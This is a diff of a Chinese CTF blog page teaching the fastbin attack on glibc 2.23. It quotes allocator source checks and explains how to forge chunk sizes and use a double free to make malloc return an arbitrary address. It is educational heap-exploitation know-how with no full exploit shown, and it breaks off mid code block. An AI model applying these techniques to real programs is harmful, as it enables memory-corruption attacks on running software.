@@ -1,10 +1,10 @@
-<!doctype html><html lang=zh-CN data-theme=light><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=theme-color content="#222" media="(prefers-color-scheme: light)"><meta name=generator content="Hugo 0.146.0"><link rel="shortcut icon" type=image/x-icon href=/imgs/icons/favicon.ico><link rel=icon type=image/x-icon href=/imgs/icons/favicon.ico><link rel=icon type=image/png sizes=16x16 href=/imgs/icons/favicon_16x16_next.png><link rel=icon type=image/png sizes=32x32 href=/imgs/icons/favicon_32_32_next.png><link rel=apple-touch-icon sizes=180x180 href=/imgs/icons/apple_touch_icon_next.png><meta itemprop=name content="从零开始的 Pwn 之旅 - Fastbin Attack"><meta itemprop=description content="不想写博客..."><meta name=description content="不想写博客..."><meta itemprop=datePublished zgotmplz><meta itemprop=dateModified zgotmplz><meta itemprop=image content="/imgs/avatar.jpg"><meta itemprop=keywords content="Ctf,Pwn"><meta property="og:type" content="article"><meta property="og:title" content="从零开始的 Pwn 之旅 - Fastbin Attack"><meta property="og:description" content="不想写博客..."><meta property="og:image" content="/imgs/avatar.jpg"><meta property="og:image:width" content="312"><meta property="og:image:height" content="312"><meta property="og:image:type" content="image/jpeg/png/svg/jpg"><meta property="og:url" content="/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---fastbin-attack/"><meta property="og:site_name" content="lhon901's blog"><meta property="og:locale" content="zh-CN"><meta property="article:author" content="lhon901"><meta property="article:published_time" content="2025-08-30 21:27:08 +0800 +0800"><meta property="article:modified_time" content="2025-08-30 21:27:08 +0800 +0800"><link type=text/css rel=stylesheet href=/js/3rd/font-awesome/6.7.2/css/all.min.css><link type=text/css rel=stylesheet href=/js/3rd/animate.css/3.1.1/animate.min.css><link type=text/css rel=stylesheet href=/js/3rd/viewerjs/1.11.6/viewer.min.css><link rel=stylesheet href="/css/main.min.css?=1756563988"><style type=text/css>.post-footer hr:after{content:"~ 我可是有底线的哟 ~"}.flinks-list-footer hr:after{content:"~ 我可是有底线的哟 ~"}</style><script type=text/javascript>(function(){localDB={set:function(e,t,n){if(n===0)return;const s=new Date,o=n*864e5,i={value:t,expiry:s.getTime()+o};localStorage.setItem(e,JSON.stringify(i))},get:function(e){const t=localStorage.getItem(e);if(!t)return void 0;const n=JSON.parse(t),s=new Date;return s.getTime()>n.expiry?(localStorage.removeItem(e),void 0):n.value}},theme={active:function(){const e=localDB.get("theme");if(e==null)return;theme.toggle(e),window.matchMedia("(prefers-color-scheme: dark)").addListener(function(e){theme.toggle(e.matches?"dark":"light")})},toggle:function(e){document.documentElement.setAttribute("data-theme",e),localDB.set("theme",e,2);const t=document.querySelector("iframe.giscus-frame");if(t){const n={setConfig:{theme:e}};t.contentWindow.postMessage({giscus:n},"https://giscus.app")}}},theme.active()})(window)</script><script type=text/javascript>document.addEventListener("DOMContentLoaded",()=>{var e=document.createElement("script");e.charset="UTF-8",e.src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js",e.async=!1,e.defer=!0,document.head.appendChild(e),e.onload=function(){NexT.utils.fmtBusuanzi()}})</script><title>从零开始的 Pwn 之旅 - Fastbin Attack - lhon901's blog</title><noscript><link rel=stylesheet href=/css/noscript.css></noscript></head><body itemscope itemtype=http://schema.org/WebPage class=use-motion><div class=headband></div><main class=main><header class=header itemscope itemtype=http://schema.org/WPHeader><div class=header-inner><div class=site-brand-container><div class=site-nav-toggle><div class=toggle aria-label role=button><span class=toggle-line></span>
+<!doctype html><html lang=zh-CN data-theme=light><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=theme-color content="#222" media="(prefers-color-scheme: light)"><meta name=generator content="Hugo 0.146.0"><link rel="shortcut icon" type=image/x-icon href=/imgs/icons/favicon.ico><link rel=icon type=image/x-icon href=/imgs/icons/favicon.ico><link rel=icon type=image/png sizes=16x16 href=/imgs/icons/favicon_16x16_next.png><link rel=icon type=image/png sizes=32x32 href=/imgs/icons/favicon_32_32_next.png><link rel=apple-touch-icon sizes=180x180 href=/imgs/icons/apple_touch_icon_next.png><meta itemprop=name content="从零开始的 Pwn 之旅 - Fastbin Attack"><meta itemprop=description content="不想写博客..."><meta name=description content="不想写博客..."><meta itemprop=datePublished zgotmplz><meta itemprop=dateModified zgotmplz><meta itemprop=image content="/imgs/avatar.jpg"><meta itemprop=keywords content="Ctf,Pwn"><meta property="og:type" content="article"><meta property="og:title" content="从零开始的 Pwn 之旅 - Fastbin Attack"><meta property="og:description" content="不想写博客..."><meta property="og:image" content="/imgs/avatar.jpg"><meta property="og:image:width" content="312"><meta property="og:image:height" content="312"><meta property="og:image:type" content="image/jpeg/png/svg/jpg"><meta property="og:url" content="/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---fastbin-attack/"><meta property="og:site_name" content="lhon901's blog"><meta property="og:locale" content="zh-CN"><meta property="article:author" content="lhon901"><meta property="article:published_time" content="2025-08-30 21:27:08 +0800 +0800"><meta property="article:modified_time" content="2025-08-30 21:27:08 +0800 +0800"><link type=text/css rel=stylesheet href=/js/3rd/font-awesome/6.7.2/css/all.min.css><link type=text/css rel=stylesheet href=/js/3rd/animate.css/3.1.1/animate.min.css><link type=text/css rel=stylesheet href=/js/3rd/viewerjs/1.11.6/viewer.min.css><link rel=stylesheet href="/css/main.min.css?=1756904045"><style type=text/css>.post-footer hr:after{content:"~ 我可是有底线的哟 ~"}.flinks-list-footer hr:after{content:"~ 我可是有底线的哟 ~"}</style><script type=text/javascript>(function(){localDB={set:function(e,t,n){if(n===0)return;const s=new Date,o=n*864e5,i={value:t,expiry:s.getTime()+o};localStorage.setItem(e,JSON.stringify(i))},get:function(e){const t=localStorage.getItem(e);if(!t)return void 0;const n=JSON.parse(t),s=new Date;return s.getTime()>n.expiry?(localStorage.removeItem(e),void 0):n.value}},theme={active:function(){const e=localDB.get("theme");if(e==null)return;theme.toggle(e),window.matchMedia("(prefers-color-scheme: dark)").addListener(function(e){theme.toggle(e.matches?"dark":"light")})},toggle:function(e){document.documentElement.setAttribute("data-theme",e),localDB.set("theme",e,2);const t=document.querySelector("iframe.giscus-frame");if(t){const n={setConfig:{theme:e}};t.contentWindow.postMessage({giscus:n},"https://giscus.app")}}},theme.active()})(window)</script><script type=text/javascript>document.addEventListener("DOMContentLoaded",()=>{var e=document.createElement("script");e.charset="UTF-8",e.src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js",e.async=!1,e.defer=!0,document.head.appendChild(e),e.onload=function(){NexT.utils.fmtBusuanzi()}})</script><title>从零开始的 Pwn 之旅 - Fastbin Attack - lhon901's blog</title><noscript><link rel=stylesheet href=/css/noscript.css></noscript></head><body itemscope itemtype=http://schema.org/WebPage class=use-motion><div class=headband></div><main class=main><header class=header itemscope itemtype=http://schema.org/WPHeader><div class=header-inner><div class=site-brand-container><div class=site-nav-toggle><div class=toggle aria-label role=button><span class=toggle-line></span>
 <span class=toggle-line></span>
 <span class=toggle-line></span></div></div><div class=site-meta><a href=/ class=brand rel=start><i class=logo-line></i><h1 class=site-title>lhon901's blog</h1><i class=logo-line></i></a><p class=site-subtitle itemprop=description></p></div><div class=site-nav-right><div class="toggle popup-trigger"><i class="fa fa-search fa-fw fa-lg"></i></div></div></div><nav class=site-nav><ul class="main-menu menu"><li class="menu-item menu-item-home"><a href=/ class=hvr-icon-pulse rel=section><i class="fa fa-home hvr-icon"></i>首页</a></li><li class="menu-item menu-item-about"><a href=/ class=hvr-icon-pulse rel=section><i class="fa fa-user hvr-icon"></i>关于</a></li><li class="menu-item menu-item-flinks"><a href=/ class=hvr-icon-pulse rel=section><i class="fa fa-thumbs-up hvr-icon"></i>友情链接</a></li><li class="menu-item menu-item-example"><a href=/ class="menus-parent hvr-icon-pulse" rel=section><i class="fa fa-angles-down hvr-icon"></i>语法示例
 <span class=menu-item-shrink-icon><i class="fa fa-angle-right"></i></span></a><ul class=menu-children><li class=menu-child-item><a href=/ class=hvr-icon-pulse rel=section><i class="fa hvr-icon"></i>语法高亮</a></li><li class=menu-child-item><a href=/ class=hvr-icon-pulse rel=section><i class="fa hvr-icon"></i>数学公式</a></li><li class=menu-child-item><a href=/post/11-mermaid-charts class=hvr-icon-pulse rel=section><i class="fa hvr-icon"></i>流程图</a></li></ul></li><li class="menu-item menu-item-archives"><a href=/ class=hvr-icon-pulse rel=section><i class="fa fa-archive hvr-icon"></i>归档
 <span class=badge>28</span></a></li><li class="menu-item menu-item-commonweal"><a href=/404.html class=hvr-icon-pulse rel=section><i class="fa fa-heartbeat hvr-icon"></i>公益 404</a></li><li class="menu-item menu-item-search"><a role=button class="popup-trigger hvr-icon-pulse"><i class="fa fa-search fa-fw hvr-icon"></i>搜索</a></li></ul></nav><div class=search-pop-overlay><div class="popup search-popup"><div class=search-header><span class=search-icon><i class="fa fa-search"></i></span><div class=search-input-container><input autocomplete=off autocapitalize=off maxlength=80 placeholder=搜索... spellcheck=false type=search class=search-input></div><span class=popup-btn-close role=button><i class="fa fa-times-circle"></i></span></div><div class="search-result-container no-result"><div class=search-result-icon><i class="fa fa-spinner fa-pulse fa-5x"></i></div></div></div></div></div><div class="toggle sidebar-toggle" role=button><span class=toggle-line></span>
 <span class=toggle-line></span>
-<span class=toggle-line></span></div><aside class=sidebar><div class="sidebar-inner sidebar-nav-active sidebar-toc-active"><ul class=sidebar-nav><li class=sidebar-nav-toc>文章目录</li><li class=sidebar-nav-overview>站点概览</li></ul><div class=sidebar-panel-container><div class="post-toc-wrap sidebar-panel"><div class="post-toc animated"><nav id=TableOfContents><ul><li><a href=#简介>简介</a></li><li><a href=#原理>原理</a><ul><li><a href=#fastbin-double-free>fastbin double free</a></li></ul></li></ul></nav></div></div><div class="site-overview-wrap sidebar-panel"><div class="site-author site-overview-item animated" itemprop=author itemscope itemtype=http://schema.org/Person><img class=site-author-image itemprop=image alt=lhon901 src=/imgs/img-lazy-loading.gif data-src=/imgs/avatar.jpg><p class=site-author-name itemprop=name>lhon901</p><div class=site-description itemprop=description>不想写博客...</div></div><div class="site-state-wrap site-overview-item animated"><nav class=site-state><div class="site-state-item site-state-posts"><a href=/archives/><span class=site-state-item-count>28</span>
+<span class=toggle-line></span></div><aside class=sidebar><div class="sidebar-inner sidebar-nav-active sidebar-toc-active"><ul class=sidebar-nav><li class=sidebar-nav-toc>文章目录</li><li class=sidebar-nav-overview>站点概览</li></ul><div class=sidebar-panel-container><div class="post-toc-wrap sidebar-panel"><div class="post-toc animated"><nav id=TableOfContents><ul><li><a href=#简介>简介</a></li><li><a href=#原理>原理</a><ul><li><a href=#fastbin-double-free>fastbin double free</a><ul><li><a href=#例题>例题</a></li></ul></li></ul></li></ul></nav></div></div><div class="site-overview-wrap sidebar-panel"><div class="site-author site-overview-item animated" itemprop=author itemscope itemtype=http://schema.org/Person><img class=site-author-image itemprop=image alt=lhon901 src=/imgs/img-lazy-loading.gif data-src=/imgs/avatar.jpg><p class=site-author-name itemprop=name>lhon901</p><div class=site-description itemprop=description>不想写博客...</div></div><div class="site-state-wrap site-overview-item animated"><nav class=site-state><div class="site-state-item site-state-posts"><a href=/archives/><span class=site-state-item-count>28</span>
 <span class=site-state-item-name>日志</span></a></div><div class="site-state-item site-state-categories"><a href=/categories/><span class=site-state-item-count>2</span>
 <span class=site-state-item-name>分类</span></a></div><div class="site-state-item site-state-tags"><a href=/tags/><span class=site-state-item-count>3</span>
 <span class=site-state-item-name>标签</span></a></div></nav></div><div class="links-of-social site-overview-item animated"><span class=links-of-social-item><a href=https://github.com/craftopc title="Github → https://github.com/craftopc" rel=noopener class=hvr-icon-pulse target=_blank><i class="fab fa-github fa-fw hvr-icon"></i>
@@ -12,7 +12,7 @@ Github
 </a></span><span class=links-of-social-item><a href=mailto:lhon901@163.com title="E-Mail → mailto:lhon901@163.com" rel=noopener class=hvr-icon-pulse target=_blank><i class="fa fa-envelope fa-fw hvr-icon"></i>
 E-Mail</a></span></div><div class="cc-license animated" itemprop=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans class=cc-opacity rel=noopener target=_blank title=共享知识><img src=/imgs/img-lazy-loading.gif data-src=/imgs/cc/big/by_nc_sa.svg alt=共享知识></a></div><div class="links-of-blogroll site-overview-item animated"><div class=links-of-blogroll-title><i class="fa fa-globe fa-fw"></i>
 友情链接</div><ul class=links-of-blogroll-list><li class=links-of-blogroll-item><a href=https://gitee.com/hugo-next/hugo-theme-next title=https://gitee.com/hugo-next/hugo-theme-next target=_blank>Hugo-NexT</a></li><li class=links-of-blogroll-item><a href=https://lisenhui.cn title=https://lisenhui.cn target=_blank>凡梦星尘空间站</a></li></ul></div></div></div></div><div id=siteinfo-card-widget class=sidebar-card-widget><div class=item-headline><i class="fas fa-chart-line"></i>
-<span>网站资讯</span></div><div class=siteinfo><div class=siteinfo-item><div class=item-name><i class="fa-solid fa-calendar-check"></i>已运行：</div><div class=item-count id=runTimes data-publishdate="2025-04-14 20:18:58 +0800 +0800"></div></div><div class=siteinfo-item><div class=item-name><i class="fas fa fa-user"></i>总访客数：</div><div class=item-count id=busuanzi_value_site_uv><i class="fa fa-sync fa-spin"></i></div></div><div class=siteinfo-item><div class=item-name><i class="fas fa fa-eye"></i>页面浏览：</div><div class=item-count id=busuanzi_value_site_pv><i class="fa fa-sync fa-spin"></i></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-font"></i>总字数：</div><div class=item-count id=wordsCount data-count=61891></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-mug-hot"></i>阅读约：</div><div class=item-count id=readTimes data-times=136></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-clock-rotate-left"></i>最后更新于：</div><div class=item-count id=last-push-date data-lastpushdate="2025-08-30 21:27:08 +0800 +0800"></div></div></div></div></aside><div class=sidebar-dimmer></div></header><div class=tool-buttons><div id=goto-i18n-translate class=button title=多语言翻译><i class="fas fa-globe"></i></div><div id=toggle-theme class=button title=深浅模式切换><i class="fas fa-adjust"></i></div><div class=back-to-top role=button title=返回顶部><i class="fa fa-arrow-up"></i>
+<span>网站资讯</span></div><div class=siteinfo><div class=siteinfo-item><div class=item-name><i class="fa-solid fa-calendar-check"></i>已运行：</div><div class=item-count id=runTimes data-publishdate="2025-04-14 20:18:58 +0800 +0800"></div></div><div class=siteinfo-item><div class=item-name><i class="fas fa fa-user"></i>总访客数：</div><div class=item-count id=busuanzi_value_site_uv><i class="fa fa-sync fa-spin"></i></div></div><div class=siteinfo-item><div class=item-name><i class="fas fa fa-eye"></i>页面浏览：</div><div class=item-count id=busuanzi_value_site_pv><i class="fa fa-sync fa-spin"></i></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-font"></i>总字数：</div><div class=item-count id=wordsCount data-count=64289></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-mug-hot"></i>阅读约：</div><div class=item-count id=readTimes data-times=141></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-clock-rotate-left"></i>最后更新于：</div><div class=item-count id=last-push-date data-lastpushdate="2025-08-30 21:27:08 +0800 +0800"></div></div></div></div></aside><div class=sidebar-dimmer></div></header><div class=tool-buttons><div id=goto-i18n-translate class=button title=多语言翻译><i class="fas fa-globe"></i></div><div id=toggle-theme class=button title=深浅模式切换><i class="fas fa-adjust"></i></div><div class=back-to-top role=button title=返回顶部><i class="fa fa-arrow-up"></i>
 <span>0%</span></div></div><div class=reading-progress-bar></div><a role=button class="book-mark-link book-mark-link-fixed"></a><a href=https://github.com/hugo-next rel="noopener external nofollow noreferrer" target=_blank title="Follow me on GitHub" class="exturl github-corner"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0 0 115 115h15l12 27L250 250V0z"/><path d="M128.3 109C113.8 99.7 119 89.6 119 89.6 122 82.7 120.5 78.6 120.5 78.6 119.2 72 123.4 76.3 123.4 76.3 127.3 80.9 125.5 87.3 125.5 87.3 122.9 97.6 130.6 101.9 134.4 103.2" fill="currentcolor" style="transform-origin:130px 106px" class="octo-arm"/><path d="M115 115C114.9 115.1 118.7 116.5 119.8 115.4l13.9-13.8C136.9 99.2 139.9 98.4 142.2 98.6 133.8 88 127.5 74.4 143.8 58 148.5 53.4 154 51.2 159.7 51 160.3 49.4 163.2 43.6 171.4 40.1 171.4 40.1 176.1 42.5 178.8 56.2 183.1 58.6 187.2 61.8 190.9 65.4 194.5 69 197.7 73.2 200.1 77.6 213.8 80.2 216.3 84.9 216.3 84.9 212.7 93.1 206.9 96 205.4 96.6 205.1 102.4 203 107.8 198.3 112.5 181.9 128.9 168.3 122.5 157.7 114.1 157.9 116.9 156.7 120.9 152.7 124.9L141 136.5C139.8 137.7 141.6 141.9 141.8 141.8z" fill="currentcolor" class="octo-body"/></svg>
 </a><script type=text/javascript src=//sidecar.gitter.im/dist/sidecar.v1.js async></script><script type=text/javascript>((window.gitter={}).chat={}).options={room:"hugo-next/community"}</script><noscript><div class=noscript-warning>Theme NexT works best with JavaScript enabled</div></noscript><div class="main-inner post posts-expand"><div class=post-block><article itemscope itemtype=http://schema.org/Article class=post-content lang><link itemprop=mainEntityOfPage href=/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---fastbin-attack/><span hidden itemprop=author itemscope itemtype=http://schema.org/Person><meta itemprop=image content="/imgs/avatar.jpg"><meta itemprop=name content="lhon901"></span><span hidden itemprop=publisher itemscope itemtype=http://schema.org/Organization><meta itemprop=name content="lhon901"><meta itemprop=description content="不想写博客..."></span><span hidden itemprop=post itemscope itemtype=http://schema.org/CreativeWork><meta itemprop=name content="从零开始的 Pwn 之旅 - Fastbin Attack"><meta itemprop=description content="简介
 
@@ -30,10 +30,10 @@ fastbin attack 指针对 ptmalloc2 中 fastbin 结构的攻击和漏洞利用手
 </span><span class=post-meta-item-text title=分类于>分类于：
 </span><span itemprop=about itemscope itemtype=http://schema.org/Thing><a href=/categories/ctf/ itemprop=url rel=index><span itemprop=name>Ctf</span></a></span></span></div><div class=post-meta-items><span class=post-meta-item title=字数><span class=post-meta-item-icon><i class="fas fa-solid fa-file-word"></i>
 </span><span class=post-meta-item-text>字数：</span>
-<span>874</span>
+<span>3272</span>
 </span><span class=post-meta-item title=阅读><span class=post-meta-item-icon><i class="fas fa-solid fa-clock"></i>
 </span><span class=post-meta-item-text>阅读：&ap;</span>
-<span>2分钟</span>
+<span>7分钟</span>
 </span><span class=post-meta-item title=浏览><span class=post-meta-item-icon><i class="fas fa-solid fa-eye"></i>
 </span><span class=post-meta-item-text>浏览：
 </span><span id=busuanzi_value_page_pv data-path=/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---fastbin-attack/><i class="fa fa-sync fa-spin"></i></span></span></div></div></header><div class="post-body autonumber" itemprop=articleBody><h2 id=简介>简介
@@ -118,29 +118,819 @@ fastbin attack 指针对 ptmalloc2 中 fastbin 结构的攻击和漏洞利用手
 </span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Fastbins[idx=2, size=0x30,ptr=0x602080]
 </span></span><span class=line><span class=cl>===&gt;Chunk(fd=0x602040, size=0x40, flags=PREV_INUSE)
 </span></span><span class=line><span class=cl>===&gt;Chunk(fd=0x602000, size=0x40, flags=PREV_INUSE)
-</span></span><span class=line><span class=cl>===&gt;Chunk(fd=0x000000, size=0x40, flags=PREV_INUSE)</span></span></code></pre></td></tr></table></div></div><p>可以看到 next chunk 的 size 的 prev_inuse 位不会被清空</p><h3 id=fastbin-double-free>fastbin double free
-<a class=header-anchor href=#fastbin-double-free></a></h3><p>当一个 fastbin 大小的 chunk 被释放时, 内部的数据会被置空, 这个 chunk 将被链接进 fastbin 这个结构<br>如果我们重复的释放同一块 chunk, 这块 chunk 的 fd 指向自身形成循环, 这时候我们如果使用 malloc 来申请当前 chunk 大小的块时, 获得的空间都会是指向这块 chunk 的<br><img src=/imgs/img-lazy-loading.gif data-src=/imgs/posts/%e4%bb%8e%e9%9b%b6%e5%bc%80%e5%a7%8b%e7%9a%84%20Pwn%20%e4%b9%8b%e6%97%85%20-%20Fastbin%20Attack/01.png alt="double free"><br>重复 free chunk2 之后示意图<br>在我们 malloc 得到这块空间之后如果我们能编辑这块空间的内容的话, 我们可以伪造 fd 字段来达到申请任意地址的目的</p><p>可是开发人员早就预料到了这种情况添加了保护, 但是开发人员添加的检测方法并不完善, 我们可以绕过</p><div class=post-alert-note><div class=post-alert-title><i class="fa-solid fa-bell"></i>
-<span>注意</span></div><div class=post-alert-content><p>fastbin 的 chunk 出于效率考虑, 在释放时不会进行合并和清除下一个 chunk size 字段的 prev_inuse 位<br>这就导致了使用 prev_inuse 位无法判断 fastbin chunk 是否被 free 了<br>开发人员必须重新编写一种方法来阻止 double free</p></div></div><p>glibc2.23 部分源码:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-4-1><a class=lnlinks href=#hl-4-1>1</a>
+</span></span><span class=line><span class=cl>===&gt;Chunk(fd=0x000000, size=0x40, flags=PREV_INUSE)</span></span></code></pre></td></tr></table></div></div><p>可以看到 next chunk 的 size 的 prev_inuse 位不会被清空</p><hr><p>伪造 fd 需绕过的安全检查</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-4-1><a class=lnlinks href=#hl-4-1>1</a>
 </span><span class=lnt id=hl-4-2><a class=lnlinks href=#hl-4-2>2</a>
 </span><span class=lnt id=hl-4-3><a class=lnlinks href=#hl-4-3>3</a>
 </span><span class=lnt id=hl-4-4><a class=lnlinks href=#hl-4-4>4</a>
 </span><span class=lnt id=hl-4-5><a class=lnlinks href=#hl-4-5>5</a>
 </span><span class=lnt id=hl-4-6><a class=lnlinks href=#hl-4-6>6</a>
 </span><span class=lnt id=hl-4-7><a class=lnlinks href=#hl-4-7>7</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>          <span class=k>if</span> <span class=p>(</span><span class=nf>__builtin_expect</span> <span class=p>(</span><span class=nf>fastbin_index</span> <span class=p>(</span><span class=nf>chunksize</span> <span class=p>(</span><span class=n>victim</span><span class=p>))</span> <span class=o>!=</span> <span class=n>idx</span><span class=p>,</span> <span class=mi>0</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>            <span class=p>{</span>
+</span></span><span class=line><span class=cl>              <span class=n>errstr</span> <span class=o>=</span> <span class=s>&#34;malloc(): memory corruption (fast)&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=nl>errout</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>              <span class=nf>malloc_printerr</span> <span class=p>(</span><span class=n>check_action</span><span class=p>,</span> <span class=n>errstr</span><span class=p>,</span> <span class=nf>chunk2mem</span> <span class=p>(</span><span class=n>victim</span><span class=p>),</span> <span class=n>av</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>              <span class=k>return</span> <span class=nb>NULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span></span></span></code></pre></td></tr></table></div></div><p>这里要求伪造的 chunk 大小所在的索引必须与指向这个伪造 chunk 的索引相同, 即:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-5-1><a class=lnlinks href=#hl-5-1>1</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>0x20<span class=o>]</span> 0x602000 -&gt; 0x602020</span></span></code></pre></td></tr></table></div></div><p>0x602000 指向的 0x602020 索引必须是 0x20 的</p><p>chunksize 相关定义:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-6-1><a class=lnlinks href=#hl-6-1>1</a>
+</span><span class=lnt id=hl-6-2><a class=lnlinks href=#hl-6-2>2</a>
+</span><span class=lnt id=hl-6-3><a class=lnlinks href=#hl-6-3>3</a>
+</span><span class=lnt id=hl-6-4><a class=lnlinks href=#hl-6-4>4</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
+</span></span></span><span class=line><span class=cl><span class=cp></span>
+</span></span><span class=line><span class=cl><span class=cm>/* Get size, ignoring use bits */</span>
+</span></span><span class=line><span class=cl><span class=cp>#define chunksize(p)         ((p)-&gt;size &amp; ~(SIZE_BITS))</span></span></span></code></pre></td></tr></table></div></div><p>这里是会清除低三位的，也就是说我们不一定非要 size 为 0x21 (比如伪造索引大小为 0x20 的 fastbin chunk), 可以是 0x20 ~ 0x27 (左闭右闭区间) 之间的任意大小, 最终都会被 chunksize 函数处理为 0x20</p><p>fastbin_idx 定义如下:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-7-1><a class=lnlinks href=#hl-7-1>1</a>
+</span><span class=lnt id=hl-7-2><a class=lnlinks href=#hl-7-2>2</a>
+</span><span class=lnt id=hl-7-3><a class=lnlinks href=#hl-7-3>3</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cm>/* offset 2 to use otherwise unindexable first 2 bins */</span>
+</span></span><span class=line><span class=cl><span class=cp>#define fastbin_index(sz) \
+</span></span></span><span class=line><span class=cl><span class=cp>  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span></span></span></code></pre></td></tr></table></div></div><p>64 位系统下会将 sz 右移 4 位, 然后减去 2</p><p>可以发现 0x20 ~ 0x2f (左闭右闭区间) 这个范围内的 size 都会被归为 idx 0 中, 即 0x20 大小的索引中</p><p>所以说我们需要伪造 chunk 的 size 字段, 如:<br>0x20 索引的 size 范围为 0x20 ~ 0x2f</p><h3 id=fastbin-double-free>fastbin double free
+<a class=header-anchor href=#fastbin-double-free></a></h3><p>当一个 fastbin 大小的 chunk 被释放时, 内部的数据会被置空, 这个 chunk 将被链接进 fastbin 这个结构<br>如果我们重复的释放同一块 chunk, 这块 chunk 的 fd 指向自身形成循环, 这时候我们如果使用 malloc 来申请当前 chunk 大小的块时, 获得的空间都会是指向这块 chunk 的<br><img src=/imgs/img-lazy-loading.gif data-src=/imgs/posts/%e4%bb%8e%e9%9b%b6%e5%bc%80%e5%a7%8b%e7%9a%84%20Pwn%20%e4%b9%8b%e6%97%85%20-%20Fastbin%20Attack/01.png alt="double free"><br>重复 free chunk2 之后示意图<br>在我们 malloc 得到这块空间之后如果我们能编辑这块空间的内容的话, 我们可以伪造 fd 字段来达到申请任意地址的目的</p><p>可是开发人员早就预料到了这种情况添加了保护, 但是开发人员添加的检测方法并不完善, 我们可以绕过</p><div class=post-alert-note><div class=post-alert-title><i class="fa-solid fa-bell"></i>
+<span>注意</span></div><div class=post-alert-content><p>fastbin 的 chunk 出于效率考虑, 在释放时不会进行合并和清除下一个 chunk size 字段的 prev_inuse 位<br>这就导致了使用 prev_inuse 位无法判断 fastbin chunk 是否被 free 了<br>开发人员必须重新编写一种方法来阻止 double free</p></div></div><p>glibc2.23 部分源码:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-8-1><a class=lnlinks href=#hl-8-1>1</a>
+</span><span class=lnt id=hl-8-2><a class=lnlinks href=#hl-8-2>2</a>
+</span><span class=lnt id=hl-8-3><a class=lnlinks href=#hl-8-3>3</a>
+</span><span class=lnt id=hl-8-4><a class=lnlinks href=#hl-8-4>4</a>
+</span><span class=lnt id=hl-8-5><a class=lnlinks href=#hl-8-5>5</a>
+</span><span class=lnt id=hl-8-6><a class=lnlinks href=#hl-8-6>6</a>
+</span><span class=lnt id=hl-8-7><a class=lnlinks href=#hl-8-7>7</a>
 </span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>	<span class=cm>/* Check that the top of the bin is not the record we are going to add
 </span></span></span><span class=line><span class=cl><span class=cm>	   (i.e., double free).  */</span>
 </span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=nf>__builtin_expect</span> <span class=p>(</span><span class=n>old</span> <span class=o>==</span> <span class=n>p</span><span class=p>,</span> <span class=mi>0</span><span class=p>))</span>
 </span></span><span class=line><span class=cl>	  <span class=p>{</span>
 </span></span><span class=line><span class=cl>	    <span class=n>errstr</span> <span class=o>=</span> <span class=s>&#34;double free or corruption (fasttop)&#34;</span><span class=p>;</span>
 </span></span><span class=line><span class=cl>	    <span class=k>goto</span> <span class=n>errout</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>	  <span class=p>}</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-5-1><a class=lnlinks href=#hl-5-1>1</a>
-</span><span class=lnt id=hl-5-2><a class=lnlinks href=#hl-5-2>2</a>
-</span><span class=lnt id=hl-5-3><a class=lnlinks href=#hl-5-3>3</a>
